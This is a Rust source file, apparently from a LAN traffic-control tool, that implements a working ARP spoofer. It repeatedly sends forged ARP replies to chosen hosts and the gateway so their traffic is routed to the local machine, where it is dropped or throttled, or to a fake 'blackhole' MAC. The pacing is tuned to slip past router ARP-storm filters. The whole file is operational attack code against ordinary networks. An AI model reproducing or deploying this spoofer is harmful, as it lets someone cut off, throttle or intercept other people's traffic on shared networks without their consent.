use parking_lot::RwLock;
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

pub static SPOOFER_TARGET_ADD_COUNT: AtomicU64 = AtomicU64::new(0);

pub fn target_add_count() -> u64 {
    SPOOFER_TARGET_ADD_COUNT.load(Ordering::SeqCst)
}

pub fn reset_target_add_count() {
    SPOOFER_TARGET_ADD_COUNT.store(0, Ordering::SeqCst);
}

use crate::spoofer::raw_l2::{craft_arp_reply, RawL2Sender};
use crate::types::{Host, HostStatus, MacAddress};

/// Locally administered unicast blackhole MAC address.
/// Frames sent to this address are silently dropped by the switch/AP at L2,
/// preventing the blocked victim's packet flood from saturating the local host's adapter.
pub const BLACKHOLE_MAC: MacAddress = MacAddress([0x02, 0xbf, 0x00, 0x00, 0x00, 0x01]);

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SpooferMode {
    /// MITM kernel drop: Victims send traffic to local host MAC, dropped by WinDivert kernel filter
    Mitm,
    /// L2 blackholing: Victims send traffic to BLACKHOLE_MAC, silently dropped by L2 switch/AP
    Blackhole,
}

#[derive(Clone)]
pub struct ArpSpoofer {
    sender: Arc<RwLock<Option<RawL2Sender>>>,
    local_mac: MacAddress,
    gateway_ip: Ipv4Addr,
    gateway_mac: MacAddress,
    targets: Arc<RwLock<HashMap<Ipv4Addr, Host>>>,
    running: Arc<AtomicBool>,
    mode: Arc<RwLock<SpooferMode>>,
}

impl ArpSpoofer {
    pub fn new_inactive(
        local_mac: MacAddress,
        gateway_ip: Ipv4Addr,
        gateway_mac: MacAddress,
    ) -> Self {
        Self {
            sender: Arc::new(RwLock::new(None)),
            local_mac,
            gateway_ip,
            gateway_mac,
            targets: Arc::new(RwLock::new(HashMap::new())),
            running: Arc::new(AtomicBool::new(false)),
            mode: Arc::new(RwLock::new(SpooferMode::Mitm)),
        }
    }

    /// Creates an ArpSpoofer equipped with a dummy sender for hermetic tests without Npcap.
    pub fn new_with_dummy_sender_for_testing(
        local_mac: MacAddress,
        gateway_ip: Ipv4Addr,
        gateway_mac: MacAddress,
    ) -> Self {
        Self {
            sender: Arc::new(RwLock::new(Some(RawL2Sender::new_dummy_for_testing()))),
            local_mac,
            gateway_ip,
            gateway_mac,
            targets: Arc::new(RwLock::new(HashMap::new())),
            running: Arc::new(AtomicBool::new(false)),
            mode: Arc::new(RwLock::new(SpooferMode::Mitm)),
        }
    }

    pub fn new(
        iface_name: &str,
        local_mac: MacAddress,
        gateway_ip: Ipv4Addr,
        gateway_mac: MacAddress,
    ) -> Self {
        let sender = match RawL2Sender::open(iface_name) {
            Ok(s) => Some(s),
            Err(e) => {
                eprintln!("[WARN] L2 raw injection initialization: {}", e);
                None
            }
        };

        Self {
            sender: Arc::new(RwLock::new(sender)),
            local_mac,
            gateway_ip,
            gateway_mac,
            targets: Arc::new(RwLock::new(HashMap::new())),
            running: Arc::new(AtomicBool::new(false)),
            mode: Arc::new(RwLock::new(SpooferMode::Mitm)),
        }
    }

    pub fn mode(&self) -> SpooferMode {
        *self.mode.read()
    }

    pub fn set_mode(&self, mode: SpooferMode) {
        *self.mode.write() = mode;
    }

    pub fn has_sender(&self) -> bool {
        self.sender.read().is_some()
    }

    pub fn target_count(&self) -> usize {
        self.targets.read().len()
    }

    pub fn add(&self, host: Host) -> Result<(), String> {
        if self.sender.read().is_none() {
            return Err(
                "Cannot add target: raw Layer 2 packet injection sender is not initialized (Npcap unavailable)"
                    .into(),
            );
        }
        if host.ip == self.gateway_ip {
            return Err("Gateway IP cannot be added as a spoofer target".into());
        }
        if host.ip.is_unspecified()
            || host.ip.is_loopback()
            || host.ip.is_broadcast()
            || host.ip.is_multicast()
        {
            return Err(format!("Invalid non-unicast target IP: {}", host.ip));
        }
        if host.mac == self.gateway_mac {
            return Err("Gateway MAC cannot be added as a spoofer target".into());
        }
        if host.mac.is_zero() || host.mac.is_broadcast() || (host.mac.0[0] & 1 != 0) {
            return Err(format!(
                "Invalid non-unicast target MAC address: {}",
                host.mac
            ));
        }
        self.targets.write().insert(host.ip, host);
        SPOOFER_TARGET_ADD_COUNT.fetch_add(1, Ordering::SeqCst);
        self.start_worker();
        Ok(())
    }

    pub fn update_status(&self, ip: &Ipv4Addr, status: crate::types::HostStatus) {
        if let Some(target) = self.targets.write().get_mut(ip) {
            target.status = status;
        }
    }

    pub fn remove(&self, ip: &Ipv4Addr) {
        if let Some(host) = self.targets.write().remove(ip) {
            self.restore(&host);
        }
    }

    pub fn remove_targets(&self, ips: &[Ipv4Addr]) {
        let mut removed = Vec::new();
        {
            let mut targets = self.targets.write();
            for ip in ips {
                if let Some(host) = targets.remove(ip) {
                    removed.push(host);
                }
            }
        }
        self.restore_all(&removed);
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
        let targets = self
            .targets
            .write()
            .drain()
            .map(|(_, h)| h)
            .collect::<Vec<_>>();
        self.restore_all(&targets);
    }

    pub fn restore(&self, host: &Host) {
        self.restore_all(&[host.clone()]);
    }

    pub fn restore_all(&self, targets: &[Host]) {
        if targets.is_empty() {
            return;
        }
        if let Some(ref sender) = *self.sender.read() {
            let num_hosts = targets.len();
            let per_host_delay = if num_hosts <= 5 {
                Duration::from_millis(10)
            } else {
                let micros = (300_000 / num_hosts).clamp(500, 5000) as u64;
                Duration::from_micros(micros)
            };

            let passes = if num_hosts <= 10 { 3 } else { 2 };
            for pass in 0..passes {
                for host in targets {
                    // Restore host: tell host that gateway is at genuine gateway_mac.
                    // Ethernet source MAC must be host's local_mac (the transmitting adapter).
                    let pkt_host = craft_arp_reply(
                        host.mac,
                        self.local_mac,
                        self.gateway_ip,
                        self.gateway_mac,
                        host.ip,
                        host.mac,
                    );
                    let _ = sender.send_frame(&pkt_host);

                    // Restore gateway: tell gateway that host is at genuine host.mac.
                    // Ethernet source MAC must be host's local_mac (the transmitting adapter).
                    let pkt_gw = craft_arp_reply(
                        self.gateway_mac,
                        self.local_mac,
                        host.ip,
                        host.mac,
                        self.gateway_ip,
                        self.gateway_mac,
                    );
                    let _ = sender.send_frame(&pkt_gw);

                    thread::sleep(per_host_delay);
                }
                if pass + 1 < passes {
                    thread::sleep(Duration::from_millis(40));
                }
            }
        }
    }

    fn start_worker(&self) {
        if self.running.swap(true, Ordering::SeqCst) {
            return;
        }

        let targets = Arc::clone(&self.targets);
        let sender = Arc::clone(&self.sender);
        let running = Arc::clone(&self.running);
        let mode = Arc::clone(&self.mode);
        let local_mac = self.local_mac;
        let gateway_ip = self.gateway_ip;
        let gateway_mac = self.gateway_mac;

        thread::spawn(move || {
            while running.load(Ordering::Relaxed) {
                let hosts: Vec<Host> = targets.read().values().cloned().collect();
                if hosts.is_empty() {
                    for _ in 0..2 {
                        if !running.load(Ordering::Relaxed) {
                            break;
                        }
                        thread::sleep(Duration::from_millis(100));
                    }
                    continue;
                }

                let current_mode = *mode.read();
                let num_hosts = hosts.len();

                // High-performance adaptive pacing:
                // Smoothly spaces packet transmissions across ~1.0 second so router ARP storm
                // filters, packet drop queues, and local NIC TX descriptors are never overwhelmed.
                let per_host_delay = if num_hosts <= 5 {
                    Duration::from_millis(40)
                } else if num_hosts <= 20 {
                    Duration::from_millis(20)
                } else {
                    let micros = (1_000_000 / num_hosts).clamp(1000, 20_000) as u64;
                    Duration::from_micros(micros)
                };

                let sweep_start = std::time::Instant::now();

                if let Some(ref s) = *sender.read() {
                    for host in &hosts {
                        if !running.load(Ordering::Relaxed) {
                            break;
                        }

                        // Determine target MAC for poisoning based on status and spoofer mode:
                        // - For Blocked: if SpooferMode::Blackhole, use BLACKHOLE_MAC so traffic is
                        //   dropped at L2 by the switch/AP. If SpooferMode::Mitm, route to local_mac
                        //   so WinDivert kernel filter drops packets.
                        // - For Limited: route to local_mac so WinDivert can shape packets.
                        let (spoof_gw_mac, spoof_host_mac) = match host.status {
                            HostStatus::Blocked(dir) => {
                                let block_target_mac = match current_mode {
                                    SpooferMode::Blackhole => BLACKHOLE_MAC,
                                    SpooferMode::Mitm => local_mac,
                                };
                                let gw_mac = if dir.includes_outgoing() {
                                    block_target_mac
                                } else {
                                    local_mac
                                };
                                let h_mac = if dir.includes_incoming() {
                                    block_target_mac
                                } else {
                                    local_mac
                                };
                                (gw_mac, h_mac)
                            }
                            _ => (local_mac, local_mac),
                        };

                        // Poison target host: Gateway IP is at spoof_gw_mac.
                        // Ethernet frame source MAC MUST be local_mac (transmitting station address on medium)
                        // so Wi-Fi APs and 802.11/NDIS firmware deliver the packet rather than dropping it.
                        let pkt_host_reply = craft_arp_reply(
                            host.mac,
                            local_mac,
                            gateway_ip,
                            spoof_gw_mac,
                            host.ip,
                            host.mac,
                        );
                        let _ = s.send_frame(&pkt_host_reply);

                        // Micro-delay between host packet and gateway packet to prevent back-to-back collision
                        thread::sleep(Duration::from_micros(100));

                        // Poison gateway: Host IP is at spoof_host_mac.
                        // Ethernet frame source MAC MUST be local_mac.
                        let pkt_gw_reply = craft_arp_reply(
                            gateway_mac,
                            local_mac,
                            host.ip,
                            spoof_host_mac,
                            gateway_ip,
                            gateway_mac,
                        );
                        let _ = s.send_frame(&pkt_gw_reply);

                        // Dual-burst on smaller networks where medium is completely unconstrained
                        if num_hosts <= 10 {
                            let _ = s.send_frame(&pkt_host_reply);
                            let _ = s.send_frame(&pkt_gw_reply);
                        }

                        // Pace between consecutive hosts
                        thread::sleep(per_host_delay);
                    }
                }

                // If sweep completed faster than target cycle (1.0s or 500ms for small target counts),
                // sleep the remainder in responsive 50ms chunks.
                let elapsed = sweep_start.elapsed();
                let target_cycle = if num_hosts <= 5 {
                    Duration::from_millis(500)
                } else {
                    Duration::from_millis(1000)
                };

                if elapsed < target_cycle {
                    let mut remaining = target_cycle - elapsed;
                    while remaining > Duration::ZERO && running.load(Ordering::Relaxed) {
                        let chunk = remaining.min(Duration::from_millis(50));
                        thread::sleep(chunk);
                        remaining = remaining.saturating_sub(chunk);
                    }
                }
            }
        });
    }
}

impl Drop for ArpSpoofer {
    fn drop(&mut self) {
        // Only run destructive teardown when the last clone drops
        if Arc::strong_count(&self.running) <= 1 {
            self.stop();
        }
    }
}
